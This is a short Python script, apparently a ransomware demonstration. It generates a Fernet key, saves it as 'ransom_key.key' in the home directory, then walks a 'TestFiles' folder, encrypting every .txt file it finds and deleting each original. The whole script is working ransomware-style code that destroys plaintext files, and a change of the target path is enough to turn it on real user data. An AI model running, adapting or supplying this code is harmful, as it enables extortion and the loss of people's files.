from cryptography.fernet import Fernet
import os

home_dir = os.path.expanduser("~")
key_file = os.path.join(home_dir, "ransom_key.key")

key = Fernet.generate_key()
with open(key_file, 'wb') as f:
    f.write(key)
cipher = Fernet(key)

def encrypt_files(target_dir):
    for root, _, files in os.walk(target_dir):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(file_path + ".encrypted", 'wb') as f:
                    f.write(encrypted)
                os.remove(file_path)
    print("Encrypted.")

encrypt_files(os.path.join(home_dir, "TestFiles"))
